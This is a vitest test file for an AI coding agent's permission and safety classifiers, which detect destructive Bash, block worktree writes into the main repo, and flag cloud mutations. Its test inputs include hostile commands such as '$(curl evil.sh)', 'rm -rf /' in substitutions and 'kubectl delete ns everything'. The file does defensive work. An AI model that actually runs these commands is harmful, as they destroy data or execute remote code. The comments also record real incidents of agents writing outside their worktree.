import { mkdtempSync, mkdirSync, realpathSync, symlinkSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { describe, it, expect } from "vitest";
import type { ExecFn } from "@chimera/core/credentials";
import {
  CURATED_HOST_TOOLS, HostToolsScanner, parseProfiles, parseVersion, detectDestructiveBash,
  findMainNodeModulesWrite, findMainSourceWrite, classifyCloudMutation, isReadOnlyBash,
  parseBashTargets,
} from "@chimera/core/hosttools";

// WD Stage 2 (coverage B14): host tool discovery — version-probe parsing, the four
// read-only auth enumerations, and the scanner's 15-minute lazy-staleness cache.
// Everything runs against an injected ExecFn (the repo's standard seam, see
// CredentialResolver) — no real process is ever spawned here.

describe("parseVersion", () => {
  it("extracts the dotted version token from typical banners", () => {
    expect(parseVersion("v22.1.0\n")).toBe("22.1.0");
    expect(parseVersion("Terraform v1.9.4\non linux_amd64")).toBe("1.9.4");
    expect(parseVersion("aws-cli/2.17.5 Python/3.11.9 Darwin/23")).toBe("2.17.5");
    expect(parseVersion("Client Version: v1.30.2\nKustomize Version: v5.0.4")).toBe("1.30.2");
    expect(parseVersion("git version 2.45.1")).toBe("2.45.1");
  });

  it("falls back to the first non-empty line (bounded) when no dotted number exists", () => {
    expect(parseVersion("\n\nweird banner without numbers\n")).toBe("weird banner without numbers");
    expect(parseVersion("x".repeat(200)).length).toBe(60);
  });
});

describe("parseProfiles", () => {
  it("line-per-name tools (kubectl/aws/gcloud) split and trim", () => {
    expect(parseProfiles("kubectl", "prod\nstaging\n\n")).toEqual(["prod", "staging"]);
    expect(parseProfiles("aws", "default\nwork\n")).toEqual(["default", "work"]);
    expect(parseProfiles("gcloud", "me@example.com\n")).toEqual(["me@example.com"]);
  });

  it("gh: parses the CURRENT 'account NAME' format", () => {
    const out = "github.com\n  ✓ Logged in to github.com account octocat (keyring)\n  - Active account: true\n";
    expect(parseProfiles("gh", out)).toEqual(["octocat"]);
  });

  it("gh: parses the OLDER 'as NAME' format and dedupes repeats", () => {
    const out = "✓ Logged in to github.com as octocat (oauth_token)\n✓ Logged in to ghe.corp as octocat (oauth_token)\n";
    expect(parseProfiles("gh", out)).toEqual(["octocat"]);
  });
});

// A scripted ExecFn: `installed` maps tool → {version stdout, profiles stdout}.
// Absent tools fail (code 1), mirroring execFile's ENOENT path. Every call is
// recorded so the cache tests can count probe sweeps.
function makeExec(installed: Record<string, { version: string; profiles?: string }>) {
  const calls: string[][] = [];
  const exec: ExecFn = async (cmd, args) => {
    calls.push([cmd, ...args]);
    const t = installed[cmd];
    if (!t) return { stdout: "", code: 1 };
    const isProfileProbe =
      (cmd === "kubectl" && args[0] === "config") || (cmd === "aws" && args[0] === "configure") ||
      (cmd === "gcloud" && args[0] === "auth") || (cmd === "gh" && args[0] === "auth");
    if (isProfileProbe) return t.profiles !== undefined ? { stdout: t.profiles, code: 0 } : { stdout: "", code: 1 };
    return { stdout: t.version, code: 0 };
  };
  return { exec, calls };
}

describe("HostToolsScanner", () => {
  it("lists ONLY installed tools, with parsed versions and enumerated profiles", async () => {
    const { exec } = makeExec({
      node: { version: "v22.1.0" },
      kubectl: { version: "Client Version: v1.30.2", profiles: "prod\nstaging" },
      gh: { version: "gh version 2.52.0 (2026-01-01)", profiles: "✓ Logged in to github.com account octocat (keyring)" },
    });
    const scanner = new HostToolsScanner({ exec });
    const tools = await scanner.tools();
    expect(tools.map((t) => t.tool).sort()).toEqual(["gh", "kubectl", "node"]);
    expect(tools.find((t) => t.tool === "node")).toEqual({ tool: "node", version: "22.1.0", profiles: [] });
    expect(tools.find((t) => t.tool === "kubectl")).toEqual({ tool: "kubectl", version: "1.30.2", profiles: ["prod", "staging"] });
    expect(tools.find((t) => t.tool === "gh")).toEqual({ tool: "gh", version: "2.52.0", profiles: ["octocat"] });
  });

  it("a failing enumeration (not logged in) yields profiles: [] — never an error", async () => {
    const { exec } = makeExec({ aws: { version: "aws-cli/2.17.5" } });   // no profiles stdout → enumeration code 1
    const tools = await new HostToolsScanner({ exec }).tools();
    expect(tools).toEqual([{ tool: "aws", version: "2.17.5", profiles: [] }]);
  });

  it("probes every curated tool exactly once per sweep (version probe each; enumeration only for the four)", async () => {
    const { exec, calls } = makeExec({ node: { version: "v22.1.0" } });
    await new HostToolsScanner({ exec }).tools();
    const versionProbes = calls.filter((c) => c[1] === "--version" || (c[1] === "version" && c[0] !== "gcloud"));
    expect(versionProbes.length).toBe(CURATED_HOST_TOOLS.length);
    // the four enumerations never ran: their tools are absent (version probe failed)
    expect(calls.some((c) => c[1] === "config" || c[1] === "configure" || c[1] === "auth")).toBe(false);
  });

  it("never runs anything but the version probe and the four documented enumerations (read-only guarantee)", async () => {
    const { exec, calls } = makeExec({
      kubectl: { version: "Client Version: v1.30.2", profiles: "prod" },
      aws: { version: "aws-cli/2.17.5", profiles: "default" },
      gcloud: { version: "Google Cloud SDK 480.0.0", profiles: "me@x.com" },
      gh: { version: "gh version 2.52.0", profiles: "account octocat" },
    });
    await new HostToolsScanner({ exec }).tools();
    const allowed = [
      /^(kubectl) version --client$/, /^(terraform) version$/, /^\S+ --version$/,
      /^kubectl config get-contexts -o name$/, /^aws configure list-profiles$/,
      /^gcloud auth list --format=value\(account\)$/, /^gh auth status$/,
    ];
    for (const c of calls) {
      const line = c.join(" ");
      expect(allowed.some((re) => re.test(line)), `unexpected probe: ${line}`).toBe(true);
    }
  });

  it("caches the sweep and lazily re-probes only after 15min staleness (documented refresh choice)", async () => {
    let nowMs = 1_000_000;
    const { exec, calls } = makeExec({ node: { version: "v22.1.0" } });
    const scanner = new HostToolsScanner({ exec, now: () => nowMs });
    await scanner.tools();
    const afterFirst = calls.length;
    nowMs += 14 * 60_000;                        // still fresh
    await scanner.tools();
    expect(calls.length).toBe(afterFirst);       // served from cache — zero new probes
    nowMs += 2 * 60_000;                         // now past the 15min ceiling
    await scanner.tools();
    expect(calls.length).toBe(afterFirst * 2);   // one full re-sweep
  });

  it("cached() exposes the last scan WITHOUT triggering one (peer.status's no-remote-execution guarantee)", async () => {
    const { exec, calls } = makeExec({ node: { version: "v22.1.0" } });
    const scanner = new HostToolsScanner({ exec });
    expect(scanner.cached()).toBeNull();
    expect(calls.length).toBe(0);                // cached() ran nothing
    await scanner.tools();
    expect(scanner.cached()).toEqual([{ tool: "node", version: "22.1.0", profiles: [] }]);
  });

  it("concurrent callers share one in-flight sweep (no probe storm)", async () => {
    const { exec, calls } = makeExec({ node: { version: "v22.1.0" } });
    const scanner = new HostToolsScanner({ exec });
    const [a, b] = await Promise.all([scanner.tools(), scanner.tools()]);
    expect(a).toEqual(b);
    expect(calls.length).toBe(CURATED_HOST_TOOLS.length);   // exactly one sweep
  });
});

// F20 D16 (coverage §C18): the auto-checkpoint trigger's destructive-Bash pattern
// detection — reuses parseBashTargets' own tokenizer/segmenter ("the SAME argv parse
// as D4's host-tools enforcement").
describe("detectDestructiveBash", () => {
  it("rm: -r AND -f both present (clustered or separate) is destructive; bare rm is not", () => {
    expect(detectDestructiveBash("rm -rf build")).toBe(true);
    expect(detectDestructiveBash("rm -fr build")).toBe(true);
    expect(detectDestructiveBash("rm -Rf build")).toBe(true);
    expect(detectDestructiveBash("rm -r -f build")).toBe(true);
    expect(detectDestructiveBash("rm --recursive --force build")).toBe(true);
    expect(detectDestructiveBash("rm -r --force build")).toBe(true);
    expect(detectDestructiveBash("rm file.txt")).toBe(false);
    expect(detectDestructiveBash("rm -f file.txt")).toBe(false);
    expect(detectDestructiveBash("rm -r somedir")).toBe(false);
  });

  it("git reset --hard is destructive; a plain/soft reset is not", () => {
    expect(detectDestructiveBash("git reset --hard")).toBe(true);
    expect(detectDestructiveBash("git reset --hard HEAD~1")).toBe(true);
    expect(detectDestructiveBash("git reset HEAD~1")).toBe(false);
    expect(detectDestructiveBash("git reset --soft HEAD~1")).toBe(false);
  });

  it("git clean requires a force flag (clean.requireForce makes a force-less clean a no-op)", () => {
    expect(detectDestructiveBash("git clean -f")).toBe(true);
    expect(detectDestructiveBash("git clean -fd")).toBe(true);
    expect(detectDestructiveBash("git clean --force")).toBe(true);
    expect(detectDestructiveBash("git clean -n")).toBe(false);
    expect(detectDestructiveBash("git clean")).toBe(false);
  });

  it("mv always triggers (argv-only detection can't tell if the destination is tracked)", () => {
    expect(detectDestructiveBash("mv a.txt b.txt")).toBe(true);
  });

  it("harmless commands never trigger", () => {
    expect(detectDestructiveBash("ls -la")).toBe(false);
    expect(detectDestructiveBash("git status")).toBe(false);
    expect(detectDestructiveBash("kubectl get pods")).toBe(false);
  });

  it("checks EVERY segment of a pipeline/sequence, same as parseBashTargets", () => {
    expect(detectDestructiveBash("cd /x && rm -rf build")).toBe(true);
    expect(detectDestructiveBash("echo hi; git reset --hard")).toBe(true);
    expect(detectDestructiveBash("ls | grep foo")).toBe(false);
  });

  it("path-invoked tools still match (basename resolution)", () => {
    expect(detectDestructiveBash("/bin/rm -rf /tmp/x")).toBe(true);
  });
});

// engine-improve WORKTREE-MAIN-GUARD: the real, twice-observed failure was an agent
// hand-rolling the node_modules symlink setup and repointing MAIN's
// packages/*/node_modules/@chimera/* links at its own worktree. These fix the exact
// mechanics (absolute path, relative escape, ln vs. an unrelated command) rather than
// just the headline case.
describe("findMainNodeModulesWrite", () => {
  const MAIN = "/repo";
  const WT = "/repo/.chimera/worktrees/task-1";

  it("catches an absolute-path ln into main's node_modules", () => {
    const hit = findMainNodeModulesWrite(
      "ln -sfn /repo/.chimera/worktrees/task-1/packages/core /repo/packages/app/node_modules/@chimera/core",
      WT, MAIN,
    );
    expect(hit).toBe("/repo/packages/app/node_modules/@chimera/core");
  });

  it("catches a RELATIVE escape from the worktree back into main's node_modules", () => {
    // WT is 3 levels under MAIN (.chimera/worktrees/task-1) — ../../../ reaches MAIN.
    const hit = findMainNodeModulesWrite("ln -sfn ../core ../../../node_modules/@chimera/core", WT, MAIN);
    expect(hit).toBe("/repo/node_modules/@chimera/core");
  });

  it("catches cp/mv/rsync/rm/unlink/ditto the same way", () => {
    for (const cmd of [
      "cp -a foo /repo/node_modules/@chimera/core",
      "mv foo /repo/node_modules/@chimera/core",
      "rsync -a foo/ /repo/node_modules/@chimera/core",
      "rm -rf /repo/node_modules/@chimera/core",
      "unlink /repo/node_modules/@chimera/core",
      "ditto foo /repo/node_modules/@chimera/core",
    ]) {
      expect(findMainNodeModulesWrite(cmd, WT, MAIN)).toBe("/repo/node_modules/@chimera/core");
    }
  });

  it("does NOT flag writing into the WORKTREE's own node_modules", () => {
    expect(findMainNodeModulesWrite("ln -sfn ../core ./node_modules/@chimera/core", WT, MAIN)).toBeNull();
  });

  it("does NOT flag READING main's node_modules as an ln SOURCE — the sanctioned worktree-setup step", () => {
    // CLAUDE.md's own documented fix: symlink the root node_modules FROM main INTO the
    // worktree. Source (main) is read, destination (worktree) is written — must stay legal.
    expect(findMainNodeModulesWrite("ln -s /repo/node_modules node_modules", WT, MAIN)).toBeNull();
  });

  it("does NOT flag an unrelated main-repo path (only node_modules is guarded)", () => {
    expect(findMainNodeModulesWrite("ln -sfn ../core /repo/packages/app/src/foo.ts", WT, MAIN)).toBeNull();
  });

  it("does NOT flag the sanctioned land-on-main git flow (git is not a mutating fs tool)", () => {
    expect(findMainNodeModulesWrite("git -C /repo merge --no-ff chimera/task-1", WT, MAIN)).toBeNull();
    expect(findMainNodeModulesWrite("git -C /repo worktree remove --force " + WT, WT, MAIN)).toBeNull();
  });

  it("does NOT flag a read-only command even if it names main's node_modules", () => {
    expect(findMainNodeModulesWrite("ls /repo/node_modules/@chimera", WT, MAIN)).toBeNull();
    expect(findMainNodeModulesWrite("cat /repo/node_modules/@chimera/core/package.json", WT, MAIN)).toBeNull();
  });

  it("checks every segment of a pipeline/sequence", () => {
    expect(findMainNodeModulesWrite("cd /x && ln -sfn ../core /repo/node_modules/@chimera/core", WT, MAIN))
      .toBe("/repo/node_modules/@chimera/core");
  });
});

// engine-improve WORKTREE-AGENT-WRITES-REACH-MAIN: findMainNodeModulesWrite only sees Bash
// argv — an Edit/Write/MultiEdit/NotebookEdit call writes straight to disk with no shell
// involved, so it was invisible to that guard. Real incident: a worktree agent's own Edit-tool
// write landed (also) inside the MAIN checkout at the same relative source path. These fixture
// paths (/repo, .../task-1) never exist on disk, exercising findMainSourceWrite's lexical
// fallback (realishPath's walk-up-to-nearest-existing-ancestor) — the REAL-symlink case is
// covered separately below with an actual temp-dir + symlink.
describe("findMainSourceWrite", () => {
  const MAIN = "/repo";
  const WT = "/repo/.chimera/worktrees/task-1";

  it("catches an Edit whose file_path is an absolute path rooted at main, not the worktree", () => {
    const hit = findMainSourceWrite("Edit", { file_path: "/repo/packages/core/src/supervisor.ts" }, WT, MAIN);
    expect(hit).toBe("/repo/packages/core/src/supervisor.ts");
  });

  it("catches Write and MultiEdit the same way", () => {
    expect(findMainSourceWrite("Write", { file_path: "/repo/packages/core/src/new.ts" }, WT, MAIN))
      .toBe("/repo/packages/core/src/new.ts");
    expect(findMainSourceWrite("MultiEdit", { file_path: "/repo/packages/core/src/supervisor.ts" }, WT, MAIN))
      .toBe("/repo/packages/core/src/supervisor.ts");
  });

  it("catches NotebookEdit via its notebook_path field", () => {
    expect(findMainSourceWrite("NotebookEdit", { notebook_path: "/repo/analysis.ipynb" }, WT, MAIN))
      .toBe("/repo/analysis.ipynb");
  });

  it("does NOT flag the identical relative path written inside the agent's OWN worktree", () => {
    expect(findMainSourceWrite("Edit", { file_path: `${WT}/packages/core/src/supervisor.ts` }, WT, MAIN)).toBeNull();
  });

  it("does NOT flag a brand-new file under the worktree (Write creates files that don't exist yet)", () => {
    expect(findMainSourceWrite("Write", { file_path: `${WT}/packages/core/src/brand-new.ts` }, WT, MAIN)).toBeNull();
  });

  it("does NOT flag a path outside main entirely (e.g. /tmp scratch)", () => {
    expect(findMainSourceWrite("Write", { file_path: "/tmp/scratch.txt" }, WT, MAIN)).toBeNull();
  });

  it("does NOT flag Read/Grep/Glob/Bash — only the Edit-family tools carry a checked field", () => {
    expect(findMainSourceWrite("Read", { file_path: "/repo/packages/core/src/supervisor.ts" }, WT, MAIN)).toBeNull();
    expect(findMainSourceWrite("Bash", { command: "cat /repo/packages/core/src/supervisor.ts" }, WT, MAIN)).toBeNull();
  });

  it("does NOT flag when the field is missing or blank", () => {
    expect(findMainSourceWrite("Edit", {}, WT, MAIN)).toBeNull();
    expect(findMainSourceWrite("Edit", { file_path: "" }, WT, MAIN)).toBeNull();
  });

  it("resolves REAL symlinks, not just the literal string — a symlinked ancestor must not let a write slip past", () => {
    // A real temp dir standing in for "main", with a real worktree dir nested inside it, and a
    // symlinked package dir OUTSIDE the worktree whose real target is a source file living
    // directly under main — proves the check is against realpathSync, not the raw path text.
    // realpathSync: macOS's /tmp is itself a symlink to /private/tmp — normalize the temp
    // root up front so the assertion below compares like-for-like resolved paths.
    const main = realpathSync(mkdtempSync(join(tmpdir(), "chimera-main-")));
    const wt = join(main, ".chimera", "worktrees", "task-1");
    mkdirSync(wt, { recursive: true });
    const realMainSrc = join(main, "packages", "core", "src");
    mkdirSync(realMainSrc, { recursive: true });
    writeFileSync(join(realMainSrc, "supervisor.ts"), "// main's real file\n");
    const linkedDir = join(main, "linked-alias");
    symlinkSync(realMainSrc, linkedDir);
    // The literal string never mentions mainRepo's real packages/core/src path at all —
    // only realpath resolution reveals it lands there.
    const hit = findMainSourceWrite("Edit", { file_path: join(linkedDir, "supervisor.ts") }, wt, main);
    expect(hit).toBe(join(realMainSrc, "supervisor.ts"));
  });
});

describe("classifyCloudMutation", () => {
  it("passes read verbs on every cloud tool", () => {
    for (const cmd of [
      "aws ec2 describe-instances",
      "aws s3 ls s3://bucket",
      "kubectl get pods -n prod",
      "kubectl logs mypod",
      "gcloud compute instances list",
      "gh pr list",
      "gh pr view 246",
    ]) {
      expect(classifyCloudMutation(cmd)).toBeNull();
    }
  });

  it("flags mutating verbs", () => {
    expect(classifyCloudMutation("aws ec2 terminate-instances --instance-ids i-1"))
      .toEqual({ tool: "aws", verb: "terminate" });
    expect(classifyCloudMutation("kubectl delete pod mypod"))
      .toEqual({ tool: "kubectl", verb: "delete" });
    expect(classifyCloudMutation("kubectl apply -f x.yaml"))
      .toEqual({ tool: "kubectl", verb: "apply" });
    expect(classifyCloudMutation("gh pr merge 246"))
      .toEqual({ tool: "gh", verb: "merge" });
  });

  it("treats --dry-run as a read", () => {
    expect(classifyCloudMutation("kubectl apply -f x.yaml --dry-run=client")).toBeNull();
  });

  it("prompts on an unrecognised verb — safe direction", () => {
    expect(classifyCloudMutation("aws ec2 frobnicate-widget"))
      .toEqual({ tool: "aws", verb: "frobnicate" });
  });

  it("ignores non-cloud tools", () => {
    expect(classifyCloudMutation("ls -la")).toBeNull();
    expect(classifyCloudMutation("git status")).toBeNull();
  });

  it("checks every segment of a compound command", () => {
    expect(classifyCloudMutation("kubectl get pods && kubectl delete pod x"))
      .toEqual({ tool: "kubectl", verb: "delete" });
  });
});

// PERM-READONLY-FALSE-PROMPTS: table-driven regression for the two confirmed cloudVerb
// defects — (1) a flag's VALUE token counted as a positional shifts the verb index for
// aws/kubectl/gh/gcloud alike, (2) a compound aws operation name (batch-get-*, etc.) whose
// FIRST hyphen-segment isn't itself a read verb. Every command here is taken verbatim from
// the bug report (the screenshot's exact aws athena calls) plus its named must-still-ask
// set — a regression here reproduces the user-facing false-prompt bug.
describe("classifyCloudMutation — PERM-READONLY-FALSE-PROMPTS (flag-value parsing, compound op names)", () => {
  const MUST_NOT_ASK: Array<[string, string]> = [
    ["aws athena list-query-executions --work-group primary", "screenshot command 1 — single-segment read verb, was already correct"],
    ["aws athena batch-get-query-execution --query-execution-ids abc123", "screenshot command 2 — batch-get-* compound op, was misread as verb 'batch'"],
    ["aws --profile prod s3 ls", "a global --profile VALUE token before the service used to shift positional[1] to 's3'"],
    ["gcloud compute instances list --project foo", "a --project VALUE token used to become the 'last positional' verb instead of 'list'"],
    ["aws dynamodb scan", "single-word read verb not in the original describe/get/list mould"],
    ["aws logs filter-log-events --log-group-name /my/group", "filter-log-events — first segment 'filter' is a read verb"],
    ["aws dynamodb batch-get-item --request-items file://x.json", "batch-get-item — another batch-get-* compound read"],
    ["kubectl apply -f x.yaml --dry-run=client", "a --dry-run mutation must NOT ask regardless of the flag-parsing fix"],
  ];
  it.each(MUST_NOT_ASK)("does not flag %s (%s)", (cmd) => {
    expect(classifyCloudMutation(cmd)).toBeNull();
  });

  const MUST_STILL_ASK: Array<[string, string, { tool: string; verb: string }]> = [
    ["aws ec2 terminate-instances", "real mutation, unaffected by the fix", { tool: "aws", verb: "terminate" }],
    ["kubectl delete pod x", "real mutation, unaffected by the fix", { tool: "kubectl", verb: "delete" }],
    ["gcloud compute instances delete x", "real mutation — 'x' (the resource arg) is still not a read verb", { tool: "gcloud", verb: "x" }],
    ["aws s3 rm s3://bucket/key", "s3 high-level 'rm' is not on the read-verb allowlist", { tool: "aws", verb: "rm" }],
    ["aws dynamodb batch-write-item --request-items file://x.json", "batch-write-item — second segment 'write' is a mutation, not read", { tool: "aws", verb: "write" }],
  ];
  it.each(MUST_STILL_ASK)("still flags %s (%s)", (cmd, _why, expected) => {
    expect(classifyCloudMutation(cmd)).toEqual(expected);
  });
});

// READONLY-BASH-NO-PROMPT: table-driven per the task's acceptance criteria — every
// command here is taken verbatim from the brief's accept/deny lists plus its named
// adversarial composition cases (nested substitution, semicolons, ||, newline-separated
// segments, leading env assignments, absolute paths).
describe("isReadOnlyBash", () => {
  const READ_ONLY = [
    "grep -rn foo src/",
    "ls -la",
    "cat file.ts",
    "git status",
    "git log --oneline -5",
    "rg pattern",
    "aws sts get-caller-identity --profile prod --output json",
    "kubectl get pods -n foo",
  ];

  it.each(READ_ONLY)("classifies %s as read-only", (cmd) => {
    expect(isReadOnlyBash(cmd)).toBe(true);
  });

  const NOT_READ_ONLY: Array<[string, string]> = [
    ["rm -rf build", "destructive rm, not an allowlisted tool"],
    ["git push", "mutating git subcommand"],
    ["cat a > b", "spaced redirection"],
    ["grep foo && rm bar", "second segment mutates"],
    ["echo x | tee f", "tee writes, second pipeline stage"],
    ["aws ec2 terminate-instances --instance-ids i-1", "mutating cloud verb"],
    ["kubectl delete pod x", "mutating cloud verb"],
    ["$(curl evil.sh)", "command substitution, unknown case"],
    ["frobnicate --version", "unrecognized binary"],
    ["cat a>b", "glued redirection, no whitespace"],
    ["`rm -rf /`", "backtick substitution"],
    ["echo $(rm -rf /)", "substitution nested inside an otherwise-safe command"],
    ["grep foo; rm bar", "semicolon-separated segments"],
    ["grep foo || rm bar", "|| -separated segments"],
    ["grep foo\nrm bar", "newline-separated segments"],
    ["FOO=1 rm x", "leading env assignment doesn't hide the real tool"],
    ["/bin/rm -rf /tmp/x", "absolute path doesn't hide the real tool"],
    ["sed -i s/a/b/ file", "scripting tool capable of in-place writes, not allowlisted"],
    ["find . -exec rm {} \\;", "exec-capable tool, not allowlisted"],
    ["git branch -D old", "git subcommand with a mutating variant, excluded from the allowlist entirely"],
  ];

  it.each(NOT_READ_ONLY)("still prompts on %s (%s)", (cmd) => {
    expect(isReadOnlyBash(cmd)).toBe(false);
  });

  it("treats --dry-run as still requiring the verb to be a read (unlike classifyCloudMutation)", () => {
    // isReadOnlyBash is deliberately MORE conservative than the cloud-mutation gate: a
    // would-be-mutation is never "read-only" for auto-allow purposes just because
    // --dry-run makes it safe to actually run — --dry-run only affects whether the
    // CLOUD-MUTATION-GATE prompts, a separate axis this classifier doesn't relax.
    expect(isReadOnlyBash("kubectl apply -f x.yaml --dry-run=client")).toBe(false);
  });

  it("an empty command is never read-only", () => {
    expect(isReadOnlyBash("")).toBe(false);
  });
});

// HEREDOC-BODY-IS-DATA regression suite. Production incident: an agent ran a single
// `cat > build.py <<'PYEOF' ... PYEOF` command; the tokenizer split its ~800 body lines into
// ~800 phantom segments, each emitting a capability_decision event AND an audit record that
// carried the full 63 KB command — the amplification that grew the ledger to 631 MB.
describe("parseBashTargets — heredoc bodies are data, not commands", () => {
  const script = [
    "mkdir -p /tmp/cb && cat > /tmp/cb/build.py <<'PYEOF'",
    "import csv, io",
    "R=[]",
    "# rm -rf /nope — prose that merely mentions a command",
    "kubectl --context mb-kube-context-prod delete ns everything",
    "print('done')",
    "PYEOF",
    "python3 /tmp/cb/build.py",
  ].join("\n");

  it("yields one target per REAL command, not one per body line", () => {
    expect(parseBashTargets(script).map((t) => t.tool)).toEqual(["mkdir", "cat", "python3"]);
  });

  it("does not surface a tool (or its profile) named inside the body", () => {
    // The body's `kubectl --context mb-kube-context-prod` is text being written to a file. Before
    // the fix it produced a kubectl target and was policy-checked against the prod context.
    expect(parseBashTargets(script).some((t) => t.tool === "kubectl")).toBe(false);
  });

  it("does not fire the destructive-Bash checkpoint on `rm -rf` that only appears in the body", () => {
    expect(detectDestructiveBash(script)).toBe(false);
    expect(detectDestructiveBash("cat <<EOF\nsafe\nEOF\nrm -rf /tmp/real")).toBe(true);   // still catches the REAL one
  });

  it("handles unquoted, double-quoted and tab-stripping (<<-) delimiters", () => {
    expect(parseBashTargets("cat <<EOF\ngit push --force\nEOF\necho ok").map((t) => t.tool)).toEqual(["cat", "echo"]);
    expect(parseBashTargets('cat <<"EOF"\ngit push --force\nEOF\necho ok').map((t) => t.tool)).toEqual(["cat", "echo"]);
    expect(parseBashTargets("cat <<-EOF\n\tgit push --force\n\tEOF\necho ok").map((t) => t.tool)).toEqual(["cat", "echo"]);
  });

  it("consumes multiple heredocs opened on one line, in order", () => {
    expect(parseBashTargets("diff <<A <<B\nrm -rf a\nA\nrm -rf b\nB\necho done").map((t) => t.tool)).toEqual(["diff", "echo"]);
  });

  it("treats an UNTERMINATED heredoc as body all the way down (fail-safe: unknown text is data)", () => {
    expect(parseBashTargets("cat <<EOF\nrm -rf /\necho never-closed").map((t) => t.tool)).toEqual(["cat"]);
  });

  it("leaves `<<<` herestrings and arithmetic shifts alone", () => {
    expect(parseBashTargets("grep foo <<< \"$blob\"\nrm -rf /tmp/x").map((t) => t.tool)).toEqual(["grep", "rm"]);
    // `$((1<<3))` must NOT be read as a heredoc opening with delimiter "3))" — that would
    // swallow every following line as body and hide real commands from the policy gate.
    expect(parseBashTargets("echo $((1<<3))\nkubectl --context prod get pods").map((t) => t.tool)).toEqual(["echo", "kubectl"]);
    expect(parseBashTargets("echo $((1<<3))\nkubectl --context prod get pods")[1]!.profile).toBe("prod");
  });

  it("keeps the command AFTER the terminator visible to the policy gate", () => {
    const targets = parseBashTargets("cat > f <<'EOF'\nwhatever\nEOF\naws --profile prod-to-qa s3 rm s3://b/k");
    expect(targets.map((t) => t.tool)).toEqual(["cat", "aws"]);
    expect(targets[1]!.profile).toBe("prod-to-qa");
  });
});
